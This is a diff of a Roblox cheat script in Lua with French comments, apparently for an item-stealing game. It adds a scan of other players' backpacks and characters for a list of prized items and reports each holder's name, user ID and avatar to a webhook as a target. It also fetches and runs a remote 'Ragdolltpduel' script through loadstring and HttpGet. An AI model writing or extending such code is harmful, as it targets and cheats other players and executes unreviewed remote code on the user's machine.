@@ -41,21 +41,42 @@ getgenv().TARGET_BRAINROTS = {
     ["Mariachi Corazoni"] = true, ["La Ginger Sekolah"] = true
 }
 
--- Fonction d'envoi Webhook (Nom + Tête du joueur)
-local function sendWebhook(playerName, playerID)
+-- Fonction de vérification d'inventaire
+local function checkInventory(player)
+    local foundItems = {}
+    
+    -- On regarde dans le sac à dos et sur le personnage
+    local locations = {player:FindFirstChild("Backpack"), player.Character}
+    
+    for _, location in pairs(locations) do
+        if location then
+            for _, item in pairs(location:GetChildren()) do
+                if getgenv().TARGET_BRAINROTS[item.Name] then
+                    table.insert(foundItems, item.Name)
+                end
+            end
+        end
+    end
+    return foundItems
+end
+
+-- Fonction d'envoi Webhook filtrée
+local function sendWebhook(playerName, playerID, itemsFound)
+    if #itemsFound == 0 then return end -- Si rien n'est trouvé, on n'envoie rien
+    
     local headshotUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. playerID .. "&width=420&height=420&format=png"
+    local itemList = table.concat(itemsFound, ", ")
     
     local data = {
         ["embeds"] = {{
-            ["title"] = "🎯 Brainrot Détecté (Ragdoll TP) !",
-            ["description"] = "Le joueur **" .. playerName .. "** possède un item cible.",
-            ["color"] = 65280, -- Vert
+            ["title"] = "🎯 Brainrot RÉEL Détecté !",
+            ["description"] = "Le joueur **" .. playerName .. "** possède ces items cibles.",
+            ["color"] = 16711680, -- Rouge
             ["thumbnail"] = { ["url"] = headshotUrl },
             ["fields"] = {
-                {["name"] = "ID du Joueur", ["value"] = tostring(playerID), ["inline"] = true},
-                {["name"] = "Statut", ["value"] = "Ciblage actif", ["inline"] = true}
+                {["name"] = "Items Détectés", ["value"] = "```" .. itemList .. "```", ["inline"] = false},
+                {["name"] = "ID du Joueur", ["value"] = tostring(playerID), ["inline"] = true}
             },
-            ["footer"] = { ["text"] = "Système de détection Nethers" },
             ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
         }}
     }
@@ -70,17 +91,17 @@ local function sendWebhook(playerName, playerID)
     end)
 end
 
--- Exécution et surveillance
+-- Surveillance
 task.spawn(function()
-    -- Déclenche le webhook quand un joueur rejoint (ou est scanné)
-    for _, player in ipairs(game.Players:GetPlayers()) do
-        sendWebhook(player.Name, player.UserId)
+    local function onPlayerDetected(player)
+        task.wait(3) -- On attend que l'inventaire charge
+        local items = checkInventory(player)
+        sendWebhook(player.Name, player.UserId, items)
     end
-    
-    game.Players.PlayerAdded:Connect(function(player)
-        sendWebhook(player.Name, player.UserId)
-    end)
 
-    -- Chargement du script Ragdolltpduel spécifié
+    game.Players.PlayerAdded:Connect(onPlayerDetected)
+    for _, p in pairs(game.Players:GetPlayers()) do onPlayerDetected(p) end
+
+    -- Lancement du script principal
     loadstring(game:HttpGet("https://raw.githubusercontent.com/nethersdev/Ragdolltpduel/main/Nethers.lua"))()
 end)
